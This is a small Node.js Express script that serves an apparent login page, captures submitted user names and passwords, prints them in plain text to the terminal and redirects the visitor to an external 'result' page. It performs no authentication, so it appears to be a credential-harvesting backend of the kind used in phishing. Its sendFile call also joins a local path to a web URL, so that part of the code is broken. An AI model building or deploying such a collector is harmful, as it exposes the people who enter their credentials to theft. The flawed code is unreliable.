const express = require('express');
const bodyParser = require('body-parser');
const readlineSync = require('readline-sync');
const app = express();
const port = 2119;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the form page (ensure you have a form.html file in the public folder)
app.get('/', (req, res) => {
  res.sendFile(__dirname + 'https://amanhoster.github.io/unity_fina/frontend/login.html');
});

// Handle form submission
app.post('/submit', (req, res) => {
  // Get form data
  const { user_name, password, } = req.body;

  // Process form data (output to terminal)
  console.log('\nForm Data Submitted:');
  console.log(`User_Name: ${user_name}`);
  console.log(`Password: ${password}`);

  // Respond back to the client

     res.redirect("https://amanhoster.github.io/unity_fina/frontend/result/resualt.html");
  //res.send('Form submitted successfully! Check the terminal for data.');
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
